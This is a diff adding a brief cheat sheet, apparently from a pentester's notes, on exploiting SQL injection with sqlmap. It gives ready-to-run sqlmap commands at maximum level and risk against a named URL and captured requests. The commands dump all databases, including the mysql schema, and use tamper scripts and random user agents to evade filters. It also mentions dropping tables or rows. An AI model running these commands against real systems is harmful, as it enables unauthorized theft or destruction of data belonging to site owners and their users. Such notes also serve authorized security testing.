@@ -1,0 +1,16 @@
+Step 1: After detection using various methods Use the sqlmap tool 
+
+### URL ### 
+sqlmap -u "https://usl.com/index.php?r=" -p "r" --force-ssl --level 5 --risk 3 --dbs --random-agent --batch --time-sec 10
+
+### Through Request###
+sqlmap -r sqlmap --level 5 --risk 3 -D mysql --dump-all --batch --random-agent --force-ssl --thread 5
+sqlmap -r sql --batch --dbs --random-agent --force-ssl --level 5 --risk 3 --tamper=space2comment
+
+Note: Do place * on the parameter in the request body where you want SQL to inject its payloads
+
+### Post sqlmap ###
+
+After finding the SQL injection or dropping the tables or rows, etc., During the reporting time, use the flag below to narrow down the requests.
+
+--test-filter=""
